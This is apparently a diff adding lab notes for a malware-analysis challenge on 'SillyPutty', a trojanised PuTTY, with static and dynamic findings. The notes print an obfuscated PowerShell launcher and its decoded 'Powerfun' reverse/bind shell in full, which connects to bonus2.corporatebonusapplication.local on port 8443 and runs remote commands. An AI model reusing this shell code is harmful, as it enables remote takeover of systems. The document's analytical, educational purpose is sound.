@@ -519,3 +519,248 @@ This relationship is crucial for detection: unknown executables spawning `cmd.ex
 - Key indicators: DNS A record for `kadusus.local`, TCP connection on port 443, reverse shell behavior, runtime string construction.
 - Analyst techniques: hosts file redirection, ProcMon filtering, listener setup for reverse shell interaction.
 
+# Challenge 1: SillyPutty
+
+Hello Analyst,
+
+The help desk has received a few calls from different IT admins regarding the attached program. They say that they've been using this program with no problems until recently. Now, it's crashing randomly and popping up blue windows when it's run. I don't like the sound of that. Do your thing!
+
+IR Team
+
+## Objective
+Perform basic static and basic dynamic analysis on this malware sample and extract facts about the malware's behavior. Answer the challenge questions below. If you get stuck, the `answers/` directory has the answers to the challenge.
+
+## Tools
+**Basic Static:**
+- File hashes
+- VirusTotal
+- FLOSS
+- PEStudio
+- PEView
+
+**Basic Dynamic Analysis:**
+- Wireshark
+- Inetsim
+- Netcat
+- TCPView
+- Procmon
+
+## Challenge Questions
+
+### Basic Static Analysis
+- What is the SHA256 hash of the sample?
+- What architecture is this binary?
+- Are there any results from submitting the SHA256 hash to VirusTotal?
+- Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?
+- Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?
+- Is it likely that this binary is packed?
+
+### Basic Dynamic Analysis
+- Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?
+- From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?
+- What is the DNS record that is queried at detonation?
+- What is the callback port number at detonation?
+- What is the callback protocol at detonation?
+- How can you use host-based telemetry to identify the DNS record, port, and protocol?
+- Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
+
+## Challenge 1: SillyPutty — Static Analysis Notes
+
+### 1. Sample Hashes
+- **SHA256:** 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83
+- **MD5:** 334a10500feb0f3444bf2e86ab2e76da
+- **SHA1:** c6a97b63fbd970984b95ae79a2b2aef5749ee463
+
+
+!!! note
+    `PEstudio` could also show teh hash values and architecture 
+
+### 2. Architecture
+- 32-bit executable (putty.exe)
+
+### 3. VirusTotal Results
+![VirusTotal detection results for putty.exe](assets/img/putty_virustotal.png)
+- 60/70 security vendors flagged this file as malicious
+- Community Score: -3
+- Crowdsourced YARA rules matched: SUSP_PS1_FromBase64String_Content_Indicator, Windows_Trojan_Metasploit
+- Tags: peexe, long-sleeps, detect-debug-environment, direct-cpu-clock-access, runtime-modules, checks-user-input
+
+### 4. Strings Analysis
+- **Tool:** FLOSS
+- **Interesting Strings:**
+
+!!! note
+    Should use floss with `-n 8`, cut down any strings to be minimum 8 
+
+``` powershell
+powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
+```
+
+**How to decode the obfuscated PowerShell payload in Linux:**
+
+1. Copy the Base64 string (everything inside the single quotes after `FromBase64String`).
+2. Save it to a file, e.g., `payload.b64`.
+3. Decode and decompress using `base64` and `gzip`:
+   ```bash
+   cat payload.b64 | base64 -d | gzip -d > payload.txt
+   ```
+   This will output the decompressed PowerShell script to `payload.txt`, which you can then review.
+
+**One-liner:**
+```bash
+base64 -d payload.b64 | gzip -d > payload.txt
+```
+Replace `payload.b64` with your filename containing the Base64 string.
+
+---
+
+**Decoded PowerShell Payload:**
+
+```powershell
+# Powerfun - Written by Ben Turner & Dave Hardy
+
+function Get-Webclient 
+{
+  $wc = New-Object -TypeName Net.WebClient
+  $wc.UseDefaultCredentials = $true
+  $wc.Proxy.Credentials = $wc.Credentials
+  $wc
+}
+function powerfun 
+{ 
+  Param( 
+  [String]$Command,
+  [String]$Sslcon,
+  [String]$Download
+  ) 
+  Process {
+  $modules = @()  
+  if ($Command -eq "bind")
+  {
+    $listener = [System.Net.Sockets.TcpListener]8443
+    $listener.start()    
+    $client = $listener.AcceptTcpClient()
+  } 
+  if ($Command -eq "reverse")
+  {
+    $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
+  }
+
+  $stream = $client.GetStream()
+
+  if ($Sslcon -eq "true") 
+  {
+    $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+    $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
+    $stream = $sslStream 
+  }
+
+  [byte[]]$bytes = 0..20000|%{0}
+  $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+  $stream.Write($sendbytes,0,$sendbytes.Length)
+
+  if ($Download -eq "true")
+  {
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
+    $stream.Write($sendbytes,0,$sendbytes.Length)
+    ForEach ($module in $modules)
+    {
+      (Get-Webclient).DownloadString($module)|Invoke-Expression
+    }
+  }
+
+  $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+  $stream.Write($sendbytes,0,$sendbytes.Length)
+
+  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+  {
+    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+    $data = $EncodedText.GetString($bytes,0, $i)
+    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+
+    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+    $x = ($error[0] | Out-String)
+    $error.clear()
+    $sendback2 = $sendback2 + $x
+
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()  
+  }
+  $client.Close()
+  $listener.Stop()
+  }
+} 
+```
+
+What does the decoded PowerShell payload do?
+
+Implements a backdoor called "Powerfun" that provides remote command execution via TCP.
+Supports two modes:
+- Bind shell: Listens on TCP port 8443 for incoming connections.
+- Reverse shell: Connects out to bonus2.corporatebonusapplication.local on port 8443.
+Optionally wraps the connection in SSL if requested.
+Sends a PowerShell prompt and system info to the remote client.
+Receives commands over the TCP stream, executes them with PowerShell, and returns the output.
+Can download and execute additional modules if instructed.
+Cleans up errors and maintains an interactive session until the connection closes.
+This payload enables an attacker to remotely control the infected system, execute arbitrary PowerShell commands, and extend functionality by loading more code.
+
+## Dynamic Analysis Notes
+
+**Initial Detonation Observations:**
+
+- At first detonation, if INetSim on REMnux is not running, the malware executes its embedded PowerShell payload.
+- The process tree (see screenshot below) shows `powershell.exe` and a child `conhost.exe` process, indicating the script is running interactively.
+- This behavior confirms the payload is being executed locally, and no network callback or shell is established without internet simulation.
+
+
+
+**Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?**
+
+ Executing the program spawns PuTTY, which appears to be the normal program. If you look closely, it also spawns a blue window for a brief moment, which is in line with the scenario brief in the README.
+
+![dynamic](assets/img/processtree.png)
+
+**From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?**
+
+The blue window that appears momentarily is a powershell.exe window. Either by using that as a pivot point and filtering on "Process name contains powershell" or by examining the child processes that are spawned from putty.exe, you can find a child `powershell.exe` process spawned at detonation with putty.exe as its parent. When examining the powershell.exe process in Procmon, the arguments indicate that Powershell is executing a Base64 encoded and compressed string at detonation.
+
+`Bonus:` If you base64 decode that string and then extract it using 7zip or the unzip utility on REMNux, the resulting stream can be written to an outfile. There, you can see the full text of the powershell reverse shell that is calling out to `bonus2.corporatebonusapplication.local`.
+
+
+![bonus2](assets/img/bonus2.png)
+
+ What is the DNS record that is queried at detonation?**
+
+The DNS record is `bonus2.corporatebonusapplication.local`. This can be found in Wireshark by filtering for DNS records at detonation.
+
+**What is the callback port number at detonation?**
+
+The port is 8443.
+
+
+![tcp_view](assets/img/tcpview_putty.png)
+
+
+**What is the callback protocol at detonation?**
+
+The protocol is SSL/TLS. This can be identified in Wireshark by the initiation of a CLIENT HELLO message from the detonation to the specified domain.
+
+
+**How can you use host-based telemetry to identify the DNS record, port, and protocol?**
+
+This can be accomplished by filtering on the name of the binary and adding an additional filter of "Operation contains TCP" in procmon.
+
+
+**Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?**
+
+A: The shell does not spawn without a proper TLS handshake, so using a basic ncat listener on port 8443 does not initiate a shell. The syntax of the PowerShell reverse shell requires TLS to complete the network transaction, so even if you use the `hosts` file and open up a listener on port 8443 to catch the incoming shell, you cannot coerce the binary to connect unless you can also provide a valid SSL certificate.
+
+There are a few ways to coerce a shell to spawn from this binary. One is to use ncat with the `--ssl` option along with rerouting the traffic to the localhost like before:
+
+```bash
+ncat -nvlp 8443 --ssl
+```
+
+![nc](assets/img/ncat-ssl.png)
